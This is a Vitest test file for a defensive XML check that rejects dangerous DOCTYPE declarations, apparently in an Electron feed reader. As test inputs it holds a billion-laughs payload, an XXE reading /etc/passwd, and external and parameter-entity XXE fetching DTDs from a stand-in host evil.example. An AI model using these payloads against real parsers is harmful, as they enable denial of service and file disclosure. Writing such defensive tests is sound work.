import { describe, it, expect } from 'vitest';
import { hasDangerousDoctype } from '../electron/utils/xmlSafety';

describe('hasDangerousDoctype', () => {

    // ── Classic attacks: DOCTYPE + ENTITY must be flagged ─────
    describe('should flag DOCTYPE declarations that define entities', () => {
        it('should flag a billion-laughs payload (internal entity expansion)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag classic XXE with SYSTEM entity (file disclosure)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag XXE with PUBLIC entity', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "-//EVIL//EN" "http://evil.example/xxe.dtd">
]>
<foo>&xxe;</foo>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag parameter-entity XXE (blind exfiltration shape)', () => {
            const xml = `<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://evil.example/evil.dtd">
  %dtd;
]>
<data>x</data>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag a single-line compact declaration', () => {
            const xml = '<!DOCTYPE r [<!ENTITY x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── Case-insensitivity ────────────────────────────────────
    describe('should be case-insensitive', () => {
        it('should flag lowercase <!doctype ... <!entity', () => {
            const xml = '<!doctype r [<!entity x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag mixed-case <!DoCtYpE ... <!EnTiTy', () => {
            const xml = '<!DoCtYpE r [<!EnTiTy x "y">]><r>&x;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── Obfuscation attempts ──────────────────────────────────
    describe('should resist realistic obfuscation inside the prolog', () => {
        it('should flag declaration spread across newlines and tabs', () => {
            const xml = '<!DOCTYPE\n\tr\n[\n\t<!ENTITY\n\t\tx\n\t\t"y">\n]>\n<r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE preceded by a UTF-8 BOM', () => {
            const xml = '﻿<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE preceded by comments and whitespace', () => {
            const xml = '  \r\n<!-- innocent looking comment -->\n\n<!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag DOCTYPE with excessive internal whitespace before the subset', () => {
            const xml = `<!DOCTYPE   r     [   <!ENTITY   x   "y">   ]><r/>`;
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag entity hidden after other markup declarations in the subset', () => {
            const xml = '<!DOCTYPE r [<!ELEMENT r (#PCDATA)><!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag an entity when a comment fakes an early root element', () => {
            // The comment holds a `<a>` that used to be mistaken for the root
            // element, moving the ENTITY "past" it and evading detection.
            const xml = '<!DOCTYPE r [<!--<a>--><!ENTITY lol "lol">]><r>&lol;</r>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should still ignore a DOCTYPE-like string hidden inside a comment', () => {
            const xml = '<!-- <!DOCTYPE r [<!ENTITY x "y">]> --><rss><channel/></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });
    });

    // ── Benign documents ──────────────────────────────────────
    describe('should accept benign documents', () => {
        it('should accept a plain DOCTYPE with no entity definitions', () => {
            // The guard only refuses DOCTYPEs that define <!ENTITY ...>;
            // a bare DOCTYPE (e.g. legacy feeds) passes through.
            const xml = '<!DOCTYPE rss><rss version="2.0"><channel/></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept a DOCTYPE with only an internal subset of ELEMENT/ATTLIST', () => {
            const xml = '<!DOCTYPE r [<!ELEMENT r (#PCDATA)><!ATTLIST r id CDATA #IMPLIED>]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept normal XML without any DOCTYPE', () => {
            const xml = '<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel><title>Pod</title></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should accept the empty string', () => {
            expect(hasDangerousDoctype('')).toBe(false);
        });

        it('should accept entity *references* (&amp; etc.) without a DOCTYPE', () => {
            const xml = '<rss><channel><title>Tom &amp; Jerry &#38; friends</title></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should not flag the literal text "<!ENTITY" without any DOCTYPE', () => {
            // Both markers are required: an ENTITY-looking string alone is inert.
            const xml = '<rss><channel><description>&lt;!ENTITY is escaped here, but this one is raw: <!ENTITY x "y"></description></channel></rss>';
            expect(hasDangerousDoctype(xml)).toBe(false);
        });
    });

    // ── Large documents / prolog window (8192 chars) ──────────
    describe('should only inspect the prolog window without false positives', () => {
        it('should accept a very large XML without DOCTYPE (no false positive)', () => {
            const items = Array.from({ length: 5000 }, (_, i) => `<item><title>Episode ${i}</title></item>`).join('');
            const xml = `<?xml version="1.0"?><rss version="2.0"><channel>${items}</channel></rss>`;
            expect(xml.length).toBeGreaterThan(150_000);
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should not flag DOCTYPE-like text appearing deep in the body (beyond 8192 chars)', () => {
            // A DOCTYPE is only meaningful before the root element; text that
            // merely *looks* like one deep inside content is ignored by design.
            const padding = '<channel><description>' + 'a'.repeat(9000) + '</description>';
            const xml = `<?xml version="1.0"?><rss>${padding}<item><title><![CDATA[<!DOCTYPE r [<!ENTITY x "y">]>]]></title></item></channel></rss>`;
            expect(hasDangerousDoctype(xml)).toBe(false);
        });

        it('should flag DOCTYPE + ENTITY when preceded by a large whitespace prolog', () => {
            const xml = '<?xml version="1.0"?>' + ' '.repeat(4000) + '<!DOCTYPE r [<!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag ENTITY even when padded far into the internal subset (no fixed window)', () => {
            // The guard now inspects the whole DOCTYPE declaration up to the root
            // element, so padding the internal subset (e.g. with a huge comment)
            // can no longer push <!ENTITY out of range.
            const xml = '<!DOCTYPE r [<!--' + 'x'.repeat(9000) + '--><!ENTITY x "y">]><r/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });

    // ── External subset (SYSTEM/PUBLIC) — now flagged ─────────
    describe('should flag external DTD references', () => {
        it('should flag an external DTD reference even without an inline ENTITY', () => {
            // <!DOCTYPE foo SYSTEM "..."> pulls an external DTD that could define
            // entities remotely — refused up front as defense in depth.
            const xml = '<!DOCTYPE foo SYSTEM "http://evil.example/evil.dtd"><foo/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });

        it('should flag a PUBLIC external DTD reference without an inline ENTITY', () => {
            const xml = '<!DOCTYPE foo PUBLIC "-//X//DTD//EN" "http://evil.example/x.dtd"><foo/>';
            expect(hasDangerousDoctype(xml)).toBe(true);
        });
    });
});
